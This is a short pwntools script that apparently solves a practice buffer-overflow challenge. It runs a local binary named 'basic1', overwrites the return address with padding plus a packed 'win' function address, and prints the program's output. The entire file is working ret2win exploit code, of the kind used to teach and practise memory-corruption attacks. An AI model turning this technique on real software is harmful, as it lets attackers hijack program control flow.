from pwn import *
import struct

p = process('./basic1')

print(p.readline().decode())

win_addr = 0x401146
padding = b'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJK'
payload = padding + struct.pack('<Q', win_addr)
print(f'sending {payload}')
p.sendline(payload)

print(p.readline().decode())